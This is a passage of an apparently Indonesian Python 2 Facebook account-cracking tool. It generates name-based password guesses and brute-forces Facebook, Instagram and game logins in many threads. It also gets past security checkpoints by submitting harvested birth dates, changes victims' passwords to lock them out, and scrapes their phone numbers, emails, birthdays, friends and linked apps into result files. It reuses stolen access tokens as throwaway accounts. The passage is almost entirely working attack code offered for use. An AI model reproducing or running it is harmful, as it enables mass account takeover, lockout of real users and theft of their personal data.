        if ' ' in san:
            san_ = san.split(' ')
            tampak = sandi_bawaan_spasi + ' ' + san
        else:
            san_ = san.split()
            tampak = sandi_bawaan_koma + ',' + san
        for dev in san_:
            if len(dev) >= 6:
                san_manual.append(dev)
            elif len(dev) == 3 or len(dev) == 4 or len(dev) == 5:
                san_manual.append(dev + '123')

    if len(san_manual) != 0:
        print h + '\n [' + p + '*' + h + ']' + p + ' Jika diGabung: ' + k + tampak
        sandi = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Gabungkan Sandi Manual dan Bawaan?' + a + '[y/n]' + h + ': ')
        if 'y' in sandi or 'Y' in sandi:
            sandi_gabung.append('IqbalDev')
            print h + '\n [' + p + '*' + h + ']' + p + ' Menggabungkan Sandi Manual dan Bawaan' + a + ' >_<'
        else:
            gak_gabung.append('IqbalDev')
            print h + '\n [' + p + '*' + h + ']' + p + ' Tidak Menggabungkan Dengan Sandi Bawaan' + m + ' X'


instagram = []
b_api = []
mobile_crack = []

def crack():
    with ThreadPoolExecutor(max_workers=25) as (c_dev):
        for data_ in user_id:
            try:
                pas = []
                _id_dev_ = data_.split()[0]
                pw = data_.split()
                w = te[0]
                if 'IqbalDev' in gak_gabung:
                    pas = san_manual
                elif 'IqbalDev' not in sandi_gabung:
                    if len(pw[1]) >= 3:
                        if len(pw) >= 3:
                            if '1' in pilih:
                                pas.append(pw[1] + pw[2])
                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                            if '2' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                            if '3' in pilih:
                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                            if '4' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                        else:
                            for dev in angka_nama:
                                if len(dev) < 3 and len(pw[1]) == 3:
                                    pass
                                else:
                                    pas.append(pw[1] + dev)

                    elif len(pw) >= 3:
                        for dev in angka_nama:
                            pas.append(pw[1] + pw[2] + dev)

                        pas.append(pw[1] + pw[2])
                    else:
                        for dev in angka_nama:
                            if len(dev) < 3:
                                pas.append(pw[1] + pw[1] + dev + dev)
                            else:
                                pas.append(pw[1] + pw[1] + dev)

                else:
                    if len(pw[1]) >= 3:
                        if len(pw) >= 3:
                            if '1' in pilih:
                                pas.append(pw[1] + pw[2])
                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                            if '2' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                            if '3' in pilih:
                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                            if '4' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                                pas.append(pw[1] + ' ' + pw[2])
                                try:
                                    pas.append(pw[1] + pw[2] + pw[3])
                                except:
                                    pass

                        else:
                            for dev in angka_nama:
                                if len(dev) < 3 and len(pw[1]) == 3:
                                    pass
                                else:
                                    pas.append(pw[1] + dev)

                    elif len(pw) >= 3:
                        for dev in angka_nama:
                            pas.append(pw[1] + pw[2] + dev)

                        pas.append(pw[1] + pw[2])
                    else:
                        for dev in angka_nama:
                            if len(dev) < 3:
                                pas.append(pw[1] + pw[1] + dev + dev)
                            else:
                                pas.append(pw[1] + pw[1] + dev)

                    pas = pas + san_manual
                f = te[0]
                if 'Dev' in san_ttl:
                    if '>>>' in data_:
                        tl_dev = []
                        pw = pw[0].split('>>>')
                        tl = str(pw[1])
                        tl_ = tl.replace('/', '')
                        tl_dev.append(tl_)
                        if len(tl_dev[0]) < 6:
                            pass
                        else:
                            pas = pas + tl_dev
                if 'IqbalDev' in instagram:
                    if '>>>' in data_:
                        id_dev_gans = _id_dev_.split('>>>')
                        c_dev.submit(crack_dev, id_dev_gans, pas)
                    else:
                        c_dev.submit(crack_dev, _id_dev_, pas)
                elif 'IqbalDev' in b_api:
                    if '>>>' in data_:
                        id_dev_gans = _id_dev_.split('>>>')
                        c_dev.submit(crack_dev_api, id_dev_gans, pas)
                    else:
                        c_dev.submit(crack_dev_api, _id_dev_, pas)
                elif 'IqbalDev' in mobile_crack:
                    if '>>>' in data_:
                        id_dev_gans = _id_dev_.split('>>>')
                        c_dev.submit(crack_mobile, id_dev_gans, pas)
                    else:
                        c_dev.submit(crack_mobile, _id_dev_, pas)
                else:
                    print ' Gak Ada Pilihan....'
            except:
                pass


tampil_ttl = []
ganti_pw = []
batas = a + ''

def _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_2, san_dev):
    global tampil_ttl
    try:
        info = []
        apk_dev = []
        sop_dev_2 = BeautifulSoup(respon_2.content, 'html.parser')
        form = sop_dev_2.find('form')
        url_post_2 = form['action']
        submit_2 = sop_dev_2.find('input', attrs={'name': 'submit[Next]'})['value']
        nh_2 = sop_dev_2.find('input', attrs={'name': 'nh'})['value']
        payload = {}
        for dev in form:
            input = dev
            payload[input.get('name')] = input.get('value')

        payload.update({'nh': nh_2, 'submit[Next]': submit_2, 'password_new': pw_new_})
        respon_3 = ses_dev.post('https://mbasic.facebook.com' + url_post_2, data=payload)
        try:
            respon_4 = ses_dev.get('https://mbasic.facebook.com/me/friends?')
            if 'zero/optin/legal/' in respon_4.text:
                try:
                    sop_gr = BeautifulSoup(respon_4.content, 'html.parser').find('form')
                    url_post = sop_gr['action']
                    payload = {}
                    for dev in sop_gr:
                        input = dev
                        payload[input.get('name')] = input.get('value')

                    ses_dev.post('https://mbasic.facebook.com' + url_post, data=payload)
                    respon_4 = ses_dev.get('https://mbasic.facebook.com/me/friends?')
                except:
                    pass

            sop_dev = BeautifulSoup(respon_4.content, 'html.parser')
            jm_teman = sop_dev.find('h3').text
            jm_teman_ = jm_teman.replace('(', '\x1b[92;1m(\x1b[97;1m').replace(')', '\x1b[92;1m)')
            jumlah_teman = h + '{' + a + 'Tem' + h + '} ' + p + jm_teman_ + ''
            if '(' not in str(jm_teman):
                jumlah_teman = h + '{' + k + 'Nul' + h + '}' + p + ' Tidak Bisa Menampilkan Jmlah Teman'
            try:
                info_ = te.replace(te, '')
                url_info = 'https://mbasic.facebook.com/profile.php?v=info'
                data_info = ses_dev.get(url_info).text
                sop_dev_info = BeautifulSoup(data_info, 'html.parser')
                info_umum = sop_dev_info.find('div', id='basic-info')
                info_kontak = sop_dev_info.find('div', id='contact-info')
                for dev in info_kontak.find_all('td', class_=True, valign='top'):
                    data_kontak = dev.text
                    if data_kontak != '':
                        if '-' in data_kontak:
                            info.append(h + '\n{' + k + 'inf' + h + '}' + p + info_ + ' No HP: ' + a + data_kontak)
                        if '@gmail.com' in data_kontak or '@yahoo.com' in data_kontak or '@email.com' in data_kontak:
                            info.append(h + '\n{' + k + 'inf' + h + '}' + p + info_ + ' Email: ' + a + data_kontak)

                no_hp = y[0]
                tanggal_lahir = info_umum.find('td', class_=True, valign='top').text
                info.append(h + '\n{' + k + 'inf' + h + '}' + p + ' TTL__: ' + h + tanggal_lahir)
            except:
                info = [
                 '\n']

            try:
                c = 1
                url_ = ['https://mbasic.facebook.com/settings/apps/tabbed/?tab=active',
                 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive']
                apk_dev.append(h + '\n{' + a + 'Apk' + h + '}' + p + ' Aplikasi yang terkait')
                for url in url_:
                    iqbal_data = ses_dev.get(url)
                    sop_dev = BeautifulSoup(iqbal_data.content, 'html.parser')
                    form_ = sop_dev.find('form', method='post')
                    for dev in form_.find_all('h3'):
                        try:
                            apk = dev.find('span').text
                            if c >= 2:
                                apk_dev.append(p + '\n    |_' + k + str(c) + ' ' + h + apk)
                            else:
                                apk_dev.append(p + '\n    \\_' + k + str(c) + ' ' + h + apk)
                            c += 1
                        except:
                            pass

            except:
                pass

            if len(apk_dev) == 1:
                apk_dev.append('\n      ' + m + 'Tidak ada Aplikasi yg Terkait..')
        except:
            jumlah_teman = ''
            jm_teman_ = ''

        data_ = data.replace(san_dev, pw_new_)
        if len(tap_yes) != 0:
            try:
                data = h + '\r{' + a + 'Yes' + h + '}' + p + (' {:<15}\x1b[92;1m | \x1b[96;1m{}   ').format(eml_dev, san_dev)
                data_ = data.replace(san_dev, pw_new_)
                if len(tampil_ttl) != 0:
                    print h + '\r{' + p + 'Suc' + h + '}' + p + ' Sukses Melewati' + h + ' Sesi TTL >>> \n' + h + '{' + k + '>/<' + h + '} Sukses Mengganti Sandi.. ' + p + '>_< Log Di Mbasic \n' + data_ + '\n' + jumlah_teman + batas
                else:
                    print h + '\r{' + k + '>/<' + h + '} Sukses Mengganti Sandi,, ' + p + '>_< Log Di Mbasic \n' + data_ + '\n' + jumlah_teman + ('').join(info) + ('').join(apk_dev) + '\n' + batas
                if 'Nul' in jumlah_teman:
                    jm_teman_ = ''
                with open('hasil_ok.txt', 'a') as (hasil):
                    hasil.write(data_ + p + jm_teman_ + '\n')
                tampil_ttl = []
            except:
                pass

        else:
            try:
                if len(tampil_ttl) != 0:
                    print h + '\r{' + p + 'Suc' + h + '}' + p + ' Sukses Melewati' + h + ' Sesi TTL   \n' + h + '{' + k + '>/<' + h + '} Sukses Mengganti Sandi--> ' + p + '>_< Log Di Mbasic \n' + data_ + '\n' + jumlah_teman + batas
                else:
                    print h + '\r{' + k + '>/<' + h + '} Sukses Mengganti Sandi-- ' + p + '>_< Log Di Mbasic \n' + data_ + '\n' + jumlah_teman + ('').join(info) + ('').join(apk_dev) + '\n' + batas
                if 'Nul' in jumlah_teman:
                    jm_teman_ = ''
                with open('hasil_ok.txt', 'a') as (hasil):
                    hasil.write(data_ + p + jm_teman_ + '\n')
                hasil_ok.append(data_)
                del hasil_cp[0]
                tampil_ttl = []
            except:
                pass

    except:
        pass


def cek_dev(eml_dev, san_dev, data):
    global ganti_pw
    try:
        iqbal = eml_dev
        eml_dev = eml_dev.replace('>>>', '')
        url = 'https://mbasic.facebook.com/login'
        with requests.Session() as (ses_dev):
            halaman = ses_dev.get(url).content
            sop = BeautifulSoup(halaman, 'html.parser')
            form = sop.find('form', id='login_form')
            url_post = form['action']
            payload = {}
            for dev in form:
                input = dev
                payload[input.get('name')] = input.get('value')

            payloads = {'lsd': str(payload['lsd']), 
               'jazoest': str(payload['jazoest']), 
               'm_ts': str(payload['m_ts']), 
               'li': str(payload['li']), 
               'try_number': str(payload['try_number']), 
               'unrecognized_tries': str(payload['unrecognized_tries']), 
               'email': str(eml_dev), 
               'pass': str(san_dev), 
               'bi_xrwh': str(payload['bi_xrwh'])}
            header = {'user-agent': 'Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]', 
               'Host': 'mbasic.facebook.com', 
               'cache-control': 'max-age=0', 
               'upgrade-insecure-requests': '1', 
               'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
               'accept-encoding': 'gzip, deflate', 
               'content-length': str(random.randint(100, 200)), 
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            respon = ses_dev.post('https://mbasic.facebook.com' + url_post + pos, data=payloads, headers=header)
            bug = []
            if 'checkpoint' in respon.cookies:
                try:
                    sop_ = BeautifulSoup(respon.content, 'html.parser')
                    form = sop_.find('form')
                    url_post = form['action']
                    nh = sop_.find('input', attrs={'name': 'nh'})['value']
                    payloads = {}
                    pay = y
                    for dev in form:
                        input = dev
                        payloads[input.get('name')] = input.get('value')

                    payloads.update({'submit[Continue]': 'Lanjutkan', 'nh': nh})
                    respon_ = ses_dev.post('https://mbasic.facebook.com' + url_post + pos, data=payloads)
                    if san_dev == pw_new:
                        pw_new_ = pw_new + '000'
                    else:
                        pw_new_ = pw_new
                    if 'password_new' in respon_.text:
                        data = data.replace('Chek', 'Yes1').replace('\x1b[90;1m', '\x1b[92;1m').replace('\x1b[93;1m', '\x1b[96;1m')
                        ganti_pw.append('dev')
                        _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_, san_dev)
                    if 'checkpointSecondaryButton' in respon_.text:
                        data = data.replace('Chek', 'Suc').replace('\x1b[90;1m', '\x1b[92;1m').replace('\x1b[93;1m', '\x1b[96;1m')
                        ganti_pw.append('dev')
                        bug.append('dev')
                        if len(pw_tap) != 0:
                            sop_dev = BeautifulSoup(respon_.content, 'html.parser')
                            form = sop_dev.find('form')
                            url_post_ = form['action']
                            submit = sop_dev.find('input', attrs={'name': 'submit[Yes]'})['value']
                            nh = sop_dev.find('input', attrs={'name': 'nh'})['value']
                            payload = {}
                            for dev in form:
                                input = dev
                                payload[input.get('name')] = input.get('value')

                            payload.update({'nh': nh, 'submit[Yes]': submit})
                            respon_2 = ses_dev.post('https://mbasic.facebook.com' + url_post_ + pos, data=payload)
                            if 'password_new' in respon_2.text:
                                _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_2, san_dev)
                        elif len(sesi) != 0:
                            print h + '\r{' + k + 'Yes' + h + '}' + h + ' Akun Tap Yes....' + p + ' >_<  Log di Mbasic \n' + data + batas + '\n'
                        else:
                            suc = h + '{' + k + 'Yes' + h + '}' + a
                            dat_dev = data.split()
                            dataku = data.replace(dat_dev[0], suc)
                            print h + '\r{' + k + 'Yes' + h + '}' + h + ' Akun Tap Yes....' + p + ' >_<  Log di Mbasic \n' + dataku + batas + '\n'
                    sop = BeautifulSoup(respon_.content, 'html.parser')
                    select_dev = sop.find('select', attrs={'name': 'verification_method'})
                    c = 1
                    option_ = []
                    sesi_ttl = []
                    for dev in select_dev.find_all('option'):
                        if c >= 2:
                            option_.append('\n' + p + ' |_' + str(c) + k + ' ' + dev.text)
                        else:
                            option_.append('\n' + p + ' \\_' + str(c) + k + ' ' + dev.text)
                        if str(dev['value']) == '2':
                            sesi_ttl.append('2')
                        c += 1

                    dat = data.split()
                    if len(pw_tap) != 0:
                        if len(sesi_ttl) == 1 and len(dat) == 7 or len(sesi_ttl) == 1 and len(dat) == 6:
                            data = data.replace('Chek', 'Yes').replace('\x1b[90;1m', '\x1b[92;1m').replace('\x1b[93;1m', '\x1b[96;1m')
                            if len(dat) == 6:
                                _ttl_dev_ = dat[5]
                            else:
                                ttl_dev = dat[6].split('m')
                                _ttl_dev_ = ttl_dev[1]
                            tl_dev = _ttl_dev_.split('/')
                            sesi_ttl = []
                            sop_dev = BeautifulSoup(respon_.content, 'html.parser')
                            form = sop_dev.find('form')
                            url_post = form['action']
                            nh = sop_dev.find('input', attrs={'name': 'nh'})['value']
                            submit = sop_dev.find('input', attrs={'name': 'submit[Continue]'})['value']
                            payload = {}
                            for dev in form:
                                input = dev
                                payload[input.get('name')] = input.get('value')

                            payload.update({'nh': nh, 'submit[Continue]': submit, 'verification_method': '2'})
                            respon_ttl = ses_dev.post('https://mbasic.facebook.com' + url_post, data=payload)
                            kondisi = []
                            c = 1
                            while True:
                                c += 1
                                if c == 3:
                                    break
                                sop_dev2 = BeautifulSoup(respon_ttl.content, 'html.parser')
                                form = sop_dev.find('form')
                                url_post_2 = form['action']
                                nh = sop_dev.find('input', attrs={'name': 'nh'})['value']
                                submit = sop_dev.find('input', attrs={'name': 'submit[Continue]'})['value']
                                payload = {}
                                for dev in form:
                                    input = dev
                                    payload[input.get('name')] = input.get('value')

                                if len(kondisi) != 1:
                                    payload.update({'nh': nh, 'submit[Continue]': submit, 'birthday_captcha_day': str(tl_dev[1]), 'birthday_captcha_month': str(tl_dev[0]), 'birthday_captcha_year': str(tl_dev[2])})
                                else:
                                    kondisi = []
                                    payload.update({'nh': nh, 'submit[Continue]': submit, 'birthday_captcha_day': str(tl_dev[0]), 'birthday_captcha_month': str(tl_dev[1]), 'birthday_captcha_year': str(tl_dev[2])})
                                respon_ttl_2 = ses_dev.post('https://mbasic.facebook.com' + url_post_2, data=payload)
                                tampil_ttl.append('IqbalDev')
                                ganti_pw.append('dev')
                                if 'checkpointSecondaryButton' in respon_ttl_2.text:
                                    bug.append('dev')
                                    sop_dev = BeautifulSoup(respon_ttl_2.content, 'html.parser')
                                    form = sop_dev.find('form')
                                    url_post_ = form['action']
                                    submit = sop_dev.find('input', attrs={'name': 'submit[Yes]'})['value']
                                    nh = sop_dev.find('input', attrs={'name': 'nh'})['value']
                                    payload = {}
                                    for dev in form:
                                        input = dev
                                        payload[input.get('name')] = input.get('value')

                                    payload.update({'nh': nh, 'submit[Yes]': submit})
                                    respon_2 = ses_dev.post('https://mbasic.facebook.com' + url_post_, data=payload)
                                    if 'password_new' in respon_2.text:
                                        _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_2, san_dev)
                                        break
                                    else:
                                        sop_ = BeautifulSoup(respon_2.content, 'html.parser')
                                        form = sop_.find('form')
                                        url_post = form['action']
                                        nh = sop_.find('input', attrs={'name': 'nh'})['value']
                                        submit = sop_.find('input', attrs={'name': 'submit[Continue]'})['value']
                                        payloads = {}
                                        for dev in form:
                                            input = dev
                                            payloads[input.get('name')] = input.get('value')

                                        payloads.update({'submit[Continue]': submit, 'nh': nh})
                                        respon_ = ses_dev.post('https://mbasic.facebook.com' + url_post, data=payloads)
                                        _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_, san_dev)
                                        break
                                elif 'password_new' in respon_ttl_2.text:
                                    _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_ttl_2, san_dev)
                                    break
                                else:
                                    kondisi.append('dev')

                    if len(ganti_pw) != 0:
                        ganti_pw = []
                    else:
                        print p + data + ('').join(option_) + '\n' + batas
                except:
                    if len(bug) == 1:
                        bug = []
                    else:
                        print data + '\n' + batas

            elif 'checkpointSecondaryButton' in respon.text:
                data = data.replace('Chek', 'Yes3').replace('\x1b[90;1m', '\x1b[92;1m').replace('\x1b[93;1m', '\x1b[96;1m')
                ganti_pw.append('dev')
                sop_dev = BeautifulSoup(respon.content, 'html.parser')
                form = sop_dev.find('form')
                url_post_ = form['action']
                submit = sop_dev.find('input', attrs={'name': 'submit[Yes]'})['value']
                nh = sop_dev.find('input', attrs={'name': 'nh'})['value']
                payload = {}
                for dev in form:
                    input = dev
                    payload[input.get('name')] = input.get('value')

                payload.update({'nh': nh, 'submit[Yes]': submit})
                respon_2 = ses_dev.post('https://mbasic.facebook.com' + url_post_ + pos, data=payload)
                if san_dev == pw_new:
                    pw_new_ = pw_new + '000'
                else:
                    pw_new_ = pw_new
                _iqbal_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_2, san_dev)
            elif 'c_user' in respon.cookies:
                print h + '\r Akun Live...\n' + a + data + '\n' + batas
            elif 'Anda menggunakan kata sandi lama.' in respon.text:
                print m + '\r Menggunakan Sandi Lama.....\n' + data + '\n' + batas
            elif '>>>' in iqbal:
                print data + '\n' + batas
    except:
        if '>>>' in iqbal:
            print data + '\n' + batas


hasil_cekpoint = []

def auto_dev():
    try:
        print a + '\n >>>' + p + ' Tekan' + h + ' CTRL+Z' + p + ' Untuk hentikan Proses\n'
        hasil_cek = open('hasil_cp.txt', 'r').readlines()
        for dev in hasil_cek:
            hasil_cekpoint.append(dev.replace('\n', ''))

        with ThreadPoolExecutor(max_workers=30) as (dev):
            for data in hasil_cekpoint:
                try:
                    if '==>' in data:
                        email = data.split('==>')[1]
                        pw = data.split('==>')[3]
                        dat = data.replace('==>', ' ')
                        dev.submit(cek_dev, email, pw, dat)
                    else:
                        email = data.split()[1]
                        pw = data.split()[3]
                        dev.submit(cek_dev, email, pw, data)
                except:
                    pass

    except IOError:
        print k + '\n Belum Ada Hasil Checkpoint..\n'
        exit()


def __pilih_crack__():
    try:
        print garis
        print h + ' [' + k + '1' + h + ']' + p + ' Crack' + a + ' Login Instagram Lewat Facebook'
        print h + ' [' + k + '2' + h + ']' + p + ' Crack' + a + ' Login Free Fire' + p + '(' + k + 'FF' + p + ')' + a + ' Lewat FB'
        print h + ' [' + k + '3' + h + ']' + p + ' Crack' + a + ' Login Mobile Legend' + p + '(' + k + 'MLBB' + p + ')' + a + ' Lewat FB'
        print h + ' [' + p + '4' + h + ']' + k + ' Crack API facebook' + a + '(' + p + 'fast Cracking' + a + ')' + h + '>> Super Pro'
        print h + ' [' + k + '5' + h + ']' + p + ' Crack' + h + ' Login Lewat facebook Mobile'
        print h + ' [' + k + '6' + h + ']' + p + ' Crack' + p + ' Login Lewat facebook' + k + ' Mbasic' + a + ' Pro..'
        print h + ' [' + k + '7' + h + ']' + p + ' Crack' + h + ' Login Lewat facebook Free'
        print garis
        pilih = raw_input(p + ' +>>>' + h + ' ')
        try:
            open('ua_dev.txt', 'r').read()
        except:
            pil_ua.append('IqbalDev')
            ua_.append('dev_id')
            __seting_ua_dev__()

        if len(ua_) == 1 and pilih == '4':
            ua = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Gunakan User-Agent Random?' + a + '[y/n]' + d + 'ENTER>Skip' + h + ': ')
            if 'y' in ua or 'Y' in ua:
                try:
                    print h + ' [' + p + '*' + h + ']' + p + ' Menggunakan' + h + ' User-Agent ' + p + 'Random'
                    ua_hp.append('IqbalDev')
                except:
                    print '\n Error\n'

            else:
                print h + ' [' + p + '*' + h + ']' + p + ' Menggunakan' + h + ' User-Agent Tunggal(1) '
        if len(ua_) == 1 and pilih != '4':
            ua = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Gunakan User-Agent Random?' + a + '[y/n]' + d + 'ENTER>Skip' + h + ': ')
            if 'y' in ua or 'Y' in ua:
                try:
                    hp = open('hp.txt', 'r').read()
                    print h + ' [' + p + '*' + h + ']' + p + ' Menggunakan' + h + ' User-Agent ' + p + 'Random'
                    ua_hp.append('IqbalDev')
                except:
                    pil_ua.append('IqbalDev')
                    __seting_ua_dev__()

            else:
                print h + ' [' + p + '*' + h + ']' + p + ' Menggunakan' + h + ' User-Agent Settingan '
        print p + ' ...........'
        print h + ' [' + k + '*' + h + ']' + p + ' Proses Crack Sedang Berjalan.. '
        print h + ' [' + k + '!' + h + ']' + p + ' Tekan Tombol CTRL+Z untuk Berhenti..!'
        print h + ' [' + k + '!' + h + ']' + k + ' Jika Tidak Muncul hasil Crack.. '
        print h + ' [' + k + '!' + h + ']' + k + ' Hidupkan-Matikan Mode Pesawat!'
        print ''
        if pilih == '1':
            instagram.append('IqbalDev')
            crack()
        elif pilih == '2':
            instagram.append('IqbalDev')
            log_ff_dev.append('IqbalDev')
            crack()
        elif pilih == '3':
            instagram.append('IqbalDev')
            log_ml_dev.append('IqbalDev')
            crack()
        elif pilih == '4':
            b_api.append('IqbalDev')
            crack()
        elif pilih == '5':
            mobile_crack.append('IqbalDev')
            crack()
        elif pilih == '6':
            log_mbasic_dev.append('IqbalDev')
            mobile_crack.append('IqbalDev')
            crack()
        elif pilih == '7':
            log_free_dev.append('IqbalDev')
            mobile_crack.append('IqbalDev')
            crack()
        else:
            __pilih_crack__()
    except KeyboardInterrupt:
        keluar()


def cek_akun_tumbal():
    print garis
    print h + '\n     Pilih Akun Buat Tumbal!\n'
    try:
        token = open('akun_tumbal.txt', 'r').readlines()
    except IOError:
        print m + '\n Belum Ada Hasil Tumbal...'
    else:
        try:
            token_ = []

            def list_(token):
                global ses_dev
                jml_tem = []
                c = 1
                with requests.Session() as (ses_dev):
                    for tok_dev in token:
                        try:
                            nama = ses_dev.get(('https://graph.facebook.com/me?access_token={}').format(tok_dev.strip('\n'))).json()['name']
                            data = ses_dev.get(('https://graph.facebook.com/me/friends?limit=5000&access_token={}').format(tok_dev.strip('\n'))).json()
                            for dev in data['data']:
                                try:
                                    jml_tem.append(dev['id'] + dev['name'])
                                except:
                                    pass

                            print h + ' [' + k + str(c) + h + '] ' + p + nama + a + ' > Teman: ' + k + str(len(jml_tem))
                            jml_tem = []
                            c += 1
                            token_.append(tok_dev)
                        except:
                            pass

                    open('akun_tumbal.txt', 'w').close()
                    for dev in token_:
                        with open('akun_tumbal.txt', 'a') as (masuk):
                            masuk.write(dev)

            with ThreadPoolExecutor(max_workers=30) as (dev_id):
                iqbal_tok = open('akun_tumbal.txt', 'r').readlines()
                dev_id.submit(list_, iqbal_tok)
            kon = True
            while kon:
                try:
                    print garis
                    pil = raw_input(a + ' [' + p + '?' + a + '] ' + p + 'Pilih' + k + ': ')
                    for dev in range(1, len(token_) + 1):
                        if int(pil) == dev:
                            kon = False
                            break

                except KeyboardInterrupt:
                    exit()
                except:
                    pass

            co = 1
            for dev in token_:
                if pil == str(co):
                    tokenz = token_.index(dev)
                    tokenku = token_[tokenz]
                co += 1

            nama = ses_dev.get(('https://graph.facebook.com/me?access_token={}').format(tokenku.strip('\n'))).json()['name']
            print a + '\n >_<' + p + ' Sukses Ganti Tumbal: ' + h + nama
            iqbalz = tokenku.replace('\n', '')
            tok_ = open('token.txt', 'w')
            tok_.write(iqbalz)
            tok_.close()
            jalankan_tool()
        except KeyError:
            print m + '\n :( Token Kedaluarsa..'


def cek_token():
    global token
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        login()
    else:
        try:
            with requests.Session() as (ses_):
                ses_.get(('https://graph.facebook.com/me?access_token={}').format(token)).json()['name']
        except KeyError:
            print m + '\n Token Kedaluarsa...'
            hapus_data_login()
            login()
        except requests.exceptions.ConnectionError:
            exit(k + '\n Gangguan Koneksi Internet!')


def _yu_():
    try:
        with open('l.txt', 'a') as (te):
            te.write('.')
    except:
        pass


def cek_cookie():
    global cookie
    try:
        c_user = open('cookie.txt', 'r').readlines()[0].strip('\n')
        fr = open('cookie.txt', 'r').readlines()[1].strip('\n')
        xs = open('cookie.txt', 'r').readlines()[2].strip('\n')
        sb = open('cookie.txt', 'r').readlines()[3].strip('\n')
        cookie = {'c_user': c_user, 'fr': fr, 
           'xs': xs, 
           'sb': sb}
    except:
        try:
            cok = open('cookie.txt').read()
            cookie = {'cookie': cok}
        except:
            if len(cek_cokie) == 1:
                print p + '\n >>>' + k + ' Harus Login Cookie Dulu!...\n'
                login_dengan_cookie_()
            else:
                login()


def banner():
    print '\n' + a + '________              ' + p + '.___________   \n' + a + '\\__  __ \\   _______  _' + p + '|   \\__  __ \\  \n' + a + ' |   \\|  \\_/ __ \\  \\/ /' + p + '   ||   \\|  \\ \n' + a + ' |    `   \\  ___/\\   /' + p + '|   ||    `   \\\n' + a + '/_______  /\\___  >\\_/ ' + p + '|___/_________/ ' + k + '\n PREMIUM' + p + ' {' + h + 'MBF' + p + '}' + a + ' \\/ {' + k + 'Author' + a + ': ' + h + 'IhsanXD.' + a + '} '
    print h + ' >>>' + p + ' IP: ' + k + ip
    print h + ' >>>' + p + ' Versi: ' + h + '2' + p + '.' + h + '2'


def login():
    try:
        user_agentzz_ = open('cokie.txt', 'r').read()
        user_agentzz = user_agentzz_.replace('|', '')
        user_agent_ = user_agentzz.split('A+ZZ')[0]
    except IOError:
        pass

    try:
        cokiez_ = open('cokiez.txt', 'r').read()
        cokiez1 = cokiez_.replace('1', '5').replace('0', '7')
        cokiez = '80' + cokiez1 + '04' + 'l'
    except IOError:
        pass

    try:
        ikuti_.append('IqbalDev')
        banner()
        print garis
        print p + '       L O G I N   F A C E B O O K'
        print garis
        print h + ' [' + p + '1' + h + ']' + p + ' Login Dengan FB' + h + ' TOKEN'
        print h + ' [' + p + '2' + h + ']' + p + ' Login Dengan FB' + h + ' Cookie'
        print h + ' [' + p + '3' + h + ']' + p + ' Login Dengan FB' + h + ' Username & Password'
        print h + ' [' + p + '4' + h + ']' + p + ' Ikuti Instagram' + h + ' IqbalDev'
        print h + ' [' + p + '5' + h + ']' + k + ' Cara ambil Cookie FB'
        try:
            if user_agent_ == cokiez:
                print h + ' [' + p + '6' + h + ']' + a + ' Crack Dari Pencarian' + p + '(' + h + 'No login' + p + ')' + a + '[' + p + 'Premium!' + a + ']'
                print h + ' [' + p + '7' + h + ']' + a + ' Cek Hasil Crack Checkpoint'
                print h + ' [' + p + '8' + h + ']' + a + ' Ganti Tumbal Hasil Crack Live'
            else:
                print k + ' [5]' + d + ' Crack Dari Pencarian(No login)[Premium!]'
                print k + ' [7]' + d + ' Cek Hasil Crack Checkpoint'
                print k + ' [8]' + d + ' Ganti Tumbal Hasil Crack Live'
        except:
            print k + ' [6]' + d + ' Crack Dari Pencarian(No login)[Premium!]'
            print k + ' [7]' + d + ' Cek Hasil Crack Checkpoint'
            print k + ' [8]' + d + ' Ganti Tumbal Hasil Crack Live'

